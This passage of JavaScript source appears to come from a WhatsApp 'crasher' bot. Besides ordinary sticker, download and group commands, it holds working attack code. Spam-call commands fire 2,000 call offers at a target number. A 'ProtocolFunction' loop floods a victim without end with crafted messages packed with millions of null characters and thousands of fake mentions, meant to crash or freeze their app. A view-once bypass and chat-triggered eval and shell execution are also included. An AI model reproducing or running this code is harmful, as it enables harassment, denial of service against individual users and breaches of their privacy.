                                        header: "⎾𝙄̷ͯ𝙉̸ͥ𝙑̽͟𝙄ͤ̕𝙎̢ͫ͛𝙄ͮ͐͟𝘽͎ͭͥ𝙇̸͂̚𝙀̡ͯ̐🩸⏌",
                                        title: "⌁⃰𝐗͢𝒊ͯ͢𝒏𝒗𝒊ͯ͢𝒔𝒊𝒃𝒍𝒆༑",
                                        description: "",
                                        id: `.xinvisible ${target}`
                                    },
                                    {
                                        header: "",
                                        title: "⌁⃰𝐈͢𝒎𝒑ͯ͢𝒆𝓻ͮ͛͢𝒄𝒆ͯ𝒑𝓽𝒊𝒃𝒍𝒆༑",
                                        description: "",
                                        id: `.minato-system ${target}`
                                    },
                                    {
                                        header: "",
                                        title: "⌁⃰𝐗͢𝐠𝐡ͯ͢𝐬𝐨𝐭༑",
                                        description: "",
                                        id: `.xghsot ${target}`
                                    },
                                    {
                                        header: "",
                                        title: "⌁⃰𝐈͢𝐧𝐜𝐨ͯ͢𝐧𝐬𝐩𝐢̷͢𝐜𝐮𝐨̌͢𝐮𝐬༑",
                                        description: "",
                                        id: `.inconspicuous ${target}`
                                    }
                                ]
                            }
                        ]
                    })
                },
                viewOnce: true
            }
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: lol2 });

    break;
}
case 'ceo': case 'co':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await sock.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRap(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./account/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero} succes add to database!`);
  break;

//END
//ACCESS CASE

case 'delceo': case 'delco':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./account/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero2} succes delate to database!`);
  break;

//END
//ACCESS CASE

case 'addacces': case 'adddaccs':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await sock.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRap(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero} succes add to database!`);
  break
  
//END
//ACCESS CASE


case 'delacces': case 'delaccs':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero2} succes delate to database!`);
  break;

//END
//QC CASE

case 'qc': {
  if (!q) return ReplyRap(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  sock.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

//END
//PLAY CASE

case "play": {
        if (!qtext) return ReplyRap(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          sock.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
      break
      
//END
//RVO CASE

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return ReplyRap("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return ReplyRap("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return ReplyRap("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await sock.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await sock.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break

//END
//SETPP CASE

case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return ReplyRap("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await sock.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await sock.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await ReplyRap("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await ReplyRap("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
//END
//DELETE PP CASE

case "delpp": {
if (!DevOnly) return 
  sock.removeProfilePicture(sock.user.id);
  ReplyRap("Success Delete Profile Picture");
}
break;

//END
//TOVN CASE

case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return ReplyRap(`Reply media with caption ${prefix + command}`);
  if (!quoted) return ReplyRap(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('./database/pusat/Data4');
  let audio = await toAudio(media, 'mp4');
  
  sock.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

//END
//HIDETAG CASE

case 'hidetag': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  sock.sendMessage(from, { text: q ? q : 'Finix Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;

//END
//KICK CASE

case 'kick': {
if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return ReplyRap("Send number / tag users ");
  await sock.groupParticipantsUpdate(from, [users], 'remove');
}
break;

//END
//GET LINK GROUP

case 'linkgroup': case 'linkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  

  let responsegg = await sock.groupInviteCode(from);
  sock.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;

//END
//RESET LINK GC CASE

case 'resetlinkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  sock.groupRevokeInvite(from);
}
break;

//END
//CONTROL CASE

case 'public': {
  if (!DevOnly) return 
  sock.public = true;
  ReplyRap(`*Success Change Mode Self To Public*`);
}
break;

//END
//CONTROL CASE

case 'self': case 'private': {
  if (!DevOnly) return
  sock.public = false;
  ReplyRap(`*Success Change Mode Public To Self*`);
}
break;

//END
//OCR CASE
case 'ocr': {

  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  if (!mime) return ReplyRap("Send / Reply Image");
  if (!/image\/(jpe?g|png)/.test(mime))
    return ReplyRap(`Tipe ${mime} tidak didukung!`);
  let image = await q.download();
  let download = await sock.getFile(image, true);
  let ocr = await ocrSpace(download.filename);
  await sock.sendMessage(
    m.chat,
    { text: ocr.ParsedResults[0].ParsedText.trim() },
    { quoted: m },
  );
}
break
//END
//TOURL CASE

case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyRap(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyRap('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return ReplyRap('Failed to download media!');
    }

    const uploadImage = require('./database/pusat/Data6');
    const uploadFile = require('./database/pusat/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return ReplyRap('Failed to upload media!');
    }

    sock.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: m });
}
break

//END
//STICKER CASE

case 'sticker': case 's': {
  if (!quoted) return ReplyRap(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await sock.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return ReplyRap('max 10s');
    
    let media = await quoted.download();
    let encmedia = await sock.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return ReplyRap(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
//END
//BRAT CASE

//END

case 'brat': {
            if (!q) return ReplyRap(`Send command with text. ${prefix + command} Minato`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, sock, m);
        }
       break

//END
//TES BOT CASE
case 'tes':
case 'status': {
ReplyRap(`*Connect*`)
}
break
//END
case "joingc": case "join": {
if (!DevOnly) return m.reply(`woi, lu siapa?`)
if (!q) return m.reply(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await sock.groupAcceptInvite(result);
m.reply(`Berhasil`)
}
break



//TIKTOK CASE		
case 'tiktok': 
      case'tt':{
        if (!qtext) return ReplyRap(`Send command with link. ${prefix + command} https://`);
         let res = await tiktok(qtext);          
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await sock.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await sock.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await sock.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await sock.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await sock.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await sock.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      
// END
//META AI CASE

case 'meta-ai': {
  if (!qtext) return ReplyRap('Send Text / Question');
            try {
                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
                const response = await fetch(apiUrl);
                const mark = await response.json();

                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

                await sock.sendMessage(m.chat, { text: ress }, {quoted:m});
                
} catch (error) {
    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
}
}
break

case 'spamcall': {
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap("Example Use.\n calloffer 62xx / @tag")
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ReplyRap(`done, mengirim spam call`)
await sleep(1000)
for (let i = 0; i < 2000; i++) {
await sendOfferCall(target)
}
}
break
case 'spamcallvid': {
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap("Example Use.\n spamcallvid 62xx / @tag")
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ReplyRap(`done, mengirim spam callvid`)
await sleep(1000)
for (let i = 0; i < 2000; i++) {
await sendOfferVideoCall(target)
}
}


//////////////////// Function Delay WhatsApp ////////////////////
async function delaymentionFree(target, mention) {
    // Generate an array of delay mentions with increased size
    const delaymention = Array.from({ length: 10000 }, (_, r) => ({
        title: "᭯" + "\u0000".repeat(500000), // Increased size
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    // Create the message structure
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@CelloOfficial2",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🌀" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 10000 }, () => 
                            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 10000,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "10000@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: null
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    // Generate the message from content
    const msg = generateWAMessageFromContent(target, MSG, {});

    // Relay the message to the status broadcast
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // If mention is true, send a status mention message
    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "🌀 𝗠𝗶𝗻𝗮𝘁𝗼 - 𝗧𝗿𝗮𝘀𝗵" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function ProtocolFunction(target) {
  let count = 0;

  while (true) {
    try {
      await delaymentionFree(target, false);
      await delay(200)

      count++;

      // Log setiap pengiriman
      console.log(chalk.green(`[ MINATO ATTACK ] Attack Ke ${count} Berhasil Ke Target: ${target}`));

      // Set delay setiap 60 iterasi
      if (count % 60 === 0) {
        console.log(chalk.yellow(`Delay 15 detik setelah ${count} pengiriman...`));
        await delay(15000);
      }
    } catch (err) {
      console.error(chalk.red("Terjadi error:"), err.message);
      await delay(5000);
    }
  }
}
  break;

case 'xghsot':
case 'inconspicuous':
case 'minato-system':
case 'xinvisible': {
  if (!PremOnly) return ReplyRap(`Premium only`);
  if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`);

  let bijipler = q.replace(/[^0-9]/g, "");
  if (bijipler.startsWith('0')) {
    return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : ${command} 62xx_\n𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸`);
  }

  let target = bijipler + '@s.whatsapp.net';


  let After = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${bijipler}
𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝘆
𖥂 𝐓𝐘𝐏𝐄   : ${command}`;

  sock.sendMessage(m.chat, {
    caption: After,
    image: { url: "https://files.catbox.moe/13qw7k.jpg" },
    footer: "𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸",
    buttons: [
      {
        buttonId: `.menu`,
        buttonText: { displayText: '𝐁͢𝐚̷𝐜͟𝐤༑' },
        type: 1,
        viewOnce: true
      },
      {
        buttonId: '.ownerdev',
        buttonText: { displayText: '༑𝐌𝐢𝐧𝐚𝐭𝐨 𝐕𝟐🩸̷ ֍-𝐓𝐞͟𝐗𝐡༑' },
        type: 1,
        viewOnce: true
      }
    ],
    headerType: 1,
    viewOnce: true
  }, { quoted: lol2 });
  ////////////// Pengiriman Bug //////////////
await ProtocolFunction(target)

}
break

//END
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!DevOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!DevOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!DevOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
// sock.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\